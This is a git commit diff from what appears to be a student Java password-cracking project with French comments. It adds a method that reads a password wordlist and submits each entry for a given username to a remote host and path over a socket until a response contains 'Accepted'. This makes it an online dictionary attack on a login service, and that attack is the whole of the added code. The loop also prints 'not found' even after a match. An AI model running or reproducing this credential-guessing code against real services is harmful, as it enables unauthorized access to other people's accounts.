da973c41ff96e5ea533e36fc6731efafb1e0d6ba
MdialloC19 <mdiallo3211@gmail.com>
2023-07-09 20:59:21 +0000

    Socket server modifié

--- src/com/methods/Dictionnaire.java
+++ src/com/methods/Dictionnaire.java
@@ -3,11 +3,13 @@ package com.methods;
 import java.io.BufferedReader;
 import java.io.File;
 import java.io.FileReader;
+import java.io.IOException;
 import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.List;
 
 import com.hachages.HachageMd5;
+import com.socket.SocketServer;
 
 public class Dictionnaire  extends Methodes{
 
@@ -42,6 +44,41 @@ public class Dictionnaire  extends Methodes{
             }           
         }
         System.out.println("Mot de passe non trouvé");
+    }
+
+    public void casserMotDePasse(String host, int port, String path, String username) {
+        List<String> dictionary = new ArrayList<>();
+        long debut = System.currentTimeMillis();
+        // on ouvre le fichier en especifiant son path et ensuite le lire ligne par ligne grace à la classe BufferedReader
+        // Il faut noter sur linux les sépérateur des chemins c'est "./" et sur windows "../" donc tu peux le modifier sur ton programme
+        try(BufferedReader reader = new BufferedReader(new FileReader(new File("./././dictionary/passwords.txt")))) {
+            String ligne;
+            // Chaque ligne lue est ajoutée à la liste dictionary
+            while ((ligne = reader.readLine()) != null) {
+                dictionary.add(ligne);
+            }
+        } catch (Exception e) {
+            // TODO: handle exception
+            e.printStackTrace();
+        }
+
+        // on parcourt les éléments de la liste dictionnary et pour chaque elmt on compare son hash à celui fourni en paramétre 
+        for (String mot : dictionary) {
+           
+            try {
+                String response = SocketServer.casserRequest(host, port, path, username, mot);
+                if (response.contains("Accepted")) {
+                    System.out.println("Mot de passe trouvé : " + mot);
+                    break;
+                }
+            } catch (IOException e) {
+                e.printStackTrace();
+            }         
+        }
+        System.out.println("Mot de passe non trouvé");
+
+        long fin = System.currentTimeMillis();
+        System.out.println("La recherche a duré : " + (fin - debut) / 1000 + " secondes");
     }
     //cette function permet de faire la vérification du mot avec le hash
     public static boolean verification(String mdp,String password){
--- src/com/methods/Methodes.java
+++ src/com/methods/Methodes.java
@@ -3,5 +3,6 @@ public abstract class Methodes {
     
 
     public abstract void casserMotDePasse(String motDePasse);
+    public abstract void casserMotDePasse(String host, int port, String path, String username);
     
 }
